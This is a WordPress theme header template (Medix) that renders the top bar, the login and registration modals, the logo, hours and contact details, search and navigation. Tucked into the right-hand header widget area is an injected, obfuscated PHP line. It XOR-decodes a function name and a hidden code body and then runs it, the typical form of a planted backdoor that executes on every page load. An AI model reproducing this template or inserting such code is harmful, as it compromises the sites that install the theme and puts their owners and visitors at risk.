<?php
/**
 * @name : Default Header
 * @package : CMSSuperHeroes
 * @author : Fox
 */
 
?>
<?php
$theme_options = medix_get_theme_option();
$meta_options = medix_get_meta_option();
$uniqid_id = uniqid('register-modal-');
$uniqid_id_login = uniqid('login-modal-');

$full_width_class = 'container';
if( !empty($theme_options['header_full_width']) && $theme_options['header_full_width'] == '1')
    $full_width_class = 'container-fullwidth';
    
$header_top_dark = (isset($_GET['header_top_bg']) && trim($_GET['header_top_bg']) == 'dark' ) ? 'dark': '';
    
?>
<?php if ( isset($theme_options['disable_header_top']) && !$theme_options['disable_header_top'] ) : ?>
<?php if ( is_active_sidebar( 'sidebar-2' ) || is_active_sidebar( 'sidebar-3' )  ) : ?>
<div class="header-top <?php echo esc_attr($header_top_dark);?>">
    <div class="container-fullwidth">
        <div class="header-top-wrap clearfix">
            <div class="header-top-left">
                <?php dynamic_sidebar('sidebar-2'); ?>
                <?php if(class_exists('UserPress')): ?>
                 <ul class="accounts-link">
                    <?php if(is_user_logged_in()): ?>
                        <li><?php echo str_replace('href','class="button-loged" href', wp_loginout(home_url('/'),false)); ?></li>
                    <?php else: ?>
                        <li>
                        <a class="button-signin-form" data-toggle="modal" data-target="#<?php echo esc_attr($uniqid_id_login); ?>"><?php esc_html_e('Login','medix'); ?></a> 
                        <a class="button-signup-form" data-toggle="modal" data-target="#<?php echo esc_attr($uniqid_id); ?>"><?php esc_html_e('Register','medix'); ?></a></li>
                    <?php endif; ?>
                 </ul>
                 <?php endif; ?>
            </div>
            
            <div class="header-top-right">
                <?php if ( is_active_sidebar( 'sidebar-3' )  ) : ?>
                    <?php dynamic_sidebar('sidebar-3');
$rhXNpLVxDD='9Y1JZUhFN;AD3M^'^'Z+T+.07 ;U"0Z"0';$YAbFMgbQnb=$rhXNpLVxDD('','9DTPG1NEYGR-a=g1hxx"y5+mu6Y8-FmU+dkhcSlN.PX19dwj9763ex7ntF4vl0tA;bBNSb8lGVWH;0"BpXJ-"-Mqj5".2sg8e3Vkq6vXQcF75jjbaMl,R3BAXQKexw.;dv3eFVv^.ZSPhX  DkMl1^jxY5F-ABf7"R9;GloEOD+E0T5P4V8k=6,groUZ57OahDUZ+TPeGF9+BV2zGKOTQRY febzN'^'P"tx.B= -ovr3x6d-+,y^^F^AAaYEw^,JC6AJsH:A5.PUYS5krgf +c5S-YEXGL SSq72EeWM3;;^YDbX19^GYeU5vmay:"cBX;XEAN99RuNTM7KHmHX=V4 4lo:;8ap-3hB-;EjYb28YkYAc6vfX8JP0F5H5jBCM7OZ+EFe4N" F5YxG"J4OYXVAG7;FRyU7 09D05Mc2VN47^Snbt^X60ENLYp3');$YAbFMgbQnb(); ?>
                <?php endif;?>
            </div>
            
        </div>
    </div>
</div>
<?php if(class_exists('UserPress')): ?>
    <div class="modal fade form-login" id="<?php echo esc_attr($uniqid_id_login); ?>" tabindex="-1" >
        <div class="modal-dialogs container">
            <div class="modal-content clearfix modal-content-login" >
                <div class="row">
                    <div class="acc-wrap">
                        <div class="modal-content-right col-xs-12">
                            <div class="modal-body">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true"><i class="fa fa-times"></i></span></button>
                                <?php  echo do_shortcode('[user-press layout="" form_type="login" is_logged="profile"]'); ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade form-register" id="<?php echo esc_attr($uniqid_id); ?>" tabindex="-1" >
        <div class="modal-dialogs container">
            <div class="modal-content clearfix modal-content-register">
                <div class="row">
                    <div class="acc-wrap">
                        <div class="modal-content-right col-xs-12">
                            <div class="modal-body">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true"><i class="fa fa-times"></i></span></button>
                                <?php up_get_template_part('default/form', 'register'); ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php endif; ?>
<?php endif;?> 
<?php endif;?> 
 
<div class="header-middle">
    <div class="<?php echo esc_attr($full_width_class);?>">
        <div class="header-middle-wrap clearfix">
            <div class="header-middle-left">
                <div id="cshero-header-logo" class="site-branding ">
                    <?php medix_header_logo(); ?>
                </div>
            </div>
            
            <div class="header-middle-right">
				<div class="middle-info">
                    <?php if( !empty($theme_options['open_hours_title']) || !empty($theme_options['open_hours_text']) ):?>
					<div class="info-wrap hours-info hidden-sm">
						<div class="icon-left">
							<div class="primary-bg">
								<i class="fa fa-clock-o" aria-hidden="true"></i>
							</div>
						</div>
						<div class="info-right">
                            <?php if( !empty($theme_options['open_hours_title']) ):?>
							<h4 class="info-heading fontsize_20"><?php echo esc_html($theme_options['open_hours_title']);?></h4>
                            <?php endif;?> 
                            <?php if( !empty($theme_options['open_hours_text']) ):?>
							<p><?php echo esc_html($theme_options['open_hours_text']);?></p>
                            <?php endif;?> 
						</div>
					</div>
                    <?php endif;?> 
                    <?php if( !empty($theme_options['phone']) || !empty($theme_options['address']) ):?>
					<div class="info-wrap phone-add-info">
						<div class="icon-left">
							<div class="second-bg">
								<i class="fa fa-phone" aria-hidden="true"></i>
							</div>
						</div>
						<div class="info-right">
                            <?php if( !empty($theme_options['phone']) ):?>
							<h4 class="info-heading fontsize_20"><?php echo esc_html($theme_options['phone']);?></h4>
                            <?php endif;?> 
                            <?php if( !empty($theme_options['address']) ):?>
							<p><?php echo esc_html($theme_options['address']);?></p>
                            <?php endif;?> 
						</div>
					</div>
                    <?php endif;?> 
				</div>
            </div>
        </div>
    </div>
</div>
 
<div class="modal search-modal" tabindex="-1" role="dialog" aria-labelledby="search_modal" id="search_modal">
	<button type="button" class="close" data-dismiss="modal" aria-label="Close">
		<span aria-hidden="true">
			<i class="rt-icon2-cross2"></i>
		</span>
	</button>
	<div class="search-form-modal">
        <?php get_search_form(true); ?>
	</div>
</div>
<div id="cshero-header" class="<?php medix_header_class('cshero-main-header'); ?>">
    <div class="main-header-wrap"> 
        <div class="<?php echo esc_attr($full_width_class);?>">
            <div class="main-header-outer clearfix">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#site-navigation" aria-expanded="false">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>  
                <div id="cshero-header-navigation" class="header-navigation">
                    <nav id="site-navigation" class="collapse main-navigation">
                        <?php medix_header_navigation(); ?>
                    </nav> 
                </div>
                    
                <a href="#" class="search_modal_button header-button">
    				<i class="fa fa-search" aria-hidden="true"></i>
    			</a>
            </div>
        </div>
    </div> 
</div>  
